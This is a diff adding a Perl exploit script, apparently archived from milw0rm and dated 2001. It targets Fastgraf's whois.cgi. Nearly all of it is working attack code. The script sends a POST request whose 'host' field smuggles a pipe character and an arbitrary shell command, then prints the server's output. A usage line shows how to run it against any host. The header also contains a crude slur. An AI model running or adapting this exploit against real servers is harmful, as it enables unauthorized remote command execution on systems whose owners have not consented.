@@ -1,0 +1,37 @@
+#!/usr/bin/perl
+###############################################################
+# whois.pl - Marco van Berkum - m.v.berkum@obit.nl            #
+# homepage: http://ws.obit.nl - exploits Fastgraf's whois.cgi #                           
+#                                                             #
+# DO NOT EDIT THIS HEADER, else the bedbugs will bite         #
+# Greets to sigmo for finding stupid POST examples            #
+# Also greetings to DUCKEL (YES YOU HAVE CREDIT NOW ;))       #
+#                                                             #
+# Use like this:                                              #
+# ./whois.pl www.ifyoureadthisyouaregay.com "ls -al"          #
+###############################################################
+
+use IO::Socket;
+$host = $ARGV[0]; $command = $ARGV[1]; $length = length($command) + 8;
+
+$sock = new IO::Socket::INET (PeerAddr => $host, PeerPort => 80, Proto    => 'tcp');
+if($sock) {
+print $sock "POST http://$host/cgi-bin/whois.cgi HTTP/1.0
+User-Agent: Whois Meta Character Exploit Browser :P
+Host: $host
+Content-length: $length
+
+host=%7c$command\n\n";
+sleep(3); # change to lower or higher, depending on your connection 
+sysread($sock, $buffer, 100000);
+        ($empty, $output) = split(/PRE/, $buffer);
+        $output =~ s/[\<\>\/]//g;
+        if($output) {
+        print("$output\n");
+       } else { print "No data, or not vulnerable\n";
+     }
+    } 
+close $sock;
+
+
+# milw0rm.com [2001-01-12]
